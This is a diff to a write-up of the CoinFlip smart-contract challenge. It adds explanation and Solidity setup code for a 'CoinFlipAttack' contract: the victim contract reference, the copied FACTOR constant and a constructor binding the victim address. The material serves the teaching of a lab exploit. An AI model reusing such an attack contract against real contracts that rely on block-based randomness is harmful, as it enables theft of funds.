@@ -31,6 +31,7 @@ victimContract.flip(side);
 ```yml
 The attack contract starts with importing the victim contract:
 ```
+- this will be used in the attack contract's constructor,
 
 ```Solidity
 // SPDX-License-Identifier: MIT
@@ -49,6 +50,23 @@ contract CoinFlipAttack {
     * for unit256 to prevent overflow and underflow attacks. 
     */
     using SafeMath for uint256;
+```
+- the attack contract also uses the state variable FACTOR from the victim contract,
+
+```Solidity
+/// @notice public state variable assigned in constructor
+    CoinFlip public victimContract; 
+    
+    // state variable assigned in function flip()
+    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
+    
+    /** 
+    * @notice victim address belonging to CoinFlip assigned as public state variable victimContract 
+    * during deployment of attack contract 
+    */
+    constructor(address _victimContractAddr) public {
+        victimContract = CoinFlip(_victimContractAddr);
+    }
 ```
 
     
